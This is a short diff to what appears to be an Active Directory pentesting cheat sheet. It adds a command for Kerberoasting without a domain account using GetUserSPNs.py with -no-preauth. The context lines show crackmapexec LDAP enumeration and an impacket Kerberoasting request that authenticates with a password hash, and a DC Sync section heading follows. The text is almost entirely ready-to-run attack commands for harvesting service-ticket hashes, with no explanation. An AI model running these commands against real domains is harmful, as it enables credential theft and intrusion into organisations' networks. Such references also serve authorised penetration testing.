@@ -39,6 +39,12 @@ crackmapexec ldap $IP -u user -p 'Password1' --kdcHost $IP -M get-desc-users
 impacket-GetUserSPNs -hashes ':11628d378a956b8ffc7e2c54b9a59574' 'domain.com/user' -dc-ip 10.10.10.10 -request -outputfile kerberoasting.hash
 ```
 
+- Kerberoasting without domain account
+
+```
+GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+```
+
 #### DC Sync
 
 ```
